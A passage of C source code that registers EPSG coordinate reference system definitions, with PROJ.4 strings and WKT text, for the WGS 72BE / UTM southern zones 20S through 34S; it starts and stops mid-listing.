add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-63],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32520\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32521, \"epsg\", 32521,\n        \"WGS 72BE / UTM zone 21S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=21 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 21S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-57],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32521\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32522, \"epsg\", 32522,\n        \"WGS 72BE / UTM zone 22S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=22 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 22S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-51],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32522\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32523, \"epsg\", 32523,\n        \"WGS 72BE / UTM zone 23S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=23 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 23S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-45],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32523\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32524, \"epsg\", 32524,\n        \"WGS 72BE / UTM zone 24S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=24 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 24S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-39],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32524\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32525, \"epsg\", 32525,\n        \"WGS 72BE / UTM zone 25S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=25 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 25S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-33],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32525\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32526, \"epsg\", 32526,\n        \"WGS 72BE / UTM zone 26S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=26 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 26S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-27],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32526\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32527, \"epsg\", 32527,\n        \"WGS 72BE / UTM zone 27S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=27 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 27S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-21],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32527\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32528, \"epsg\", 32528,\n        \"WGS 72BE / UTM zone 28S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=28 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 28S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-15],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32528\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32529, \"epsg\", 32529,\n        \"WGS 72BE / UTM zone 29S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=29 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 29S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-9],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32529\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32530, \"epsg\", 32530,\n        \"WGS 72BE / UTM zone 30S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=30 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 30S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-3],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32530\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32531, \"epsg\", 32531,\n        \"WGS 72BE / UTM zone 31S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=31 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 31S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",3],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHOR\");\n    add_srs_wkt (p, 11,\n        \"ITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"No\");\n    add_srs_wkt (p, 12,\n        \"rthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32531\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32532, \"epsg\", 32532,\n        \"WGS 72BE / UTM zone 32S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=32 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 32S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",9],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHOR\");\n    add_srs_wkt (p, 11,\n        \"ITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"No\");\n    add_srs_wkt (p, 12,\n        \"rthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32532\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32533, \"epsg\", 32533,\n        \"WGS 72BE / UTM zone 33S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=33 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 33S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",15],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32533\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32534, \"epsg\", 32534,\n        \"WGS 72BE / UTM zone 34S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=34 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text 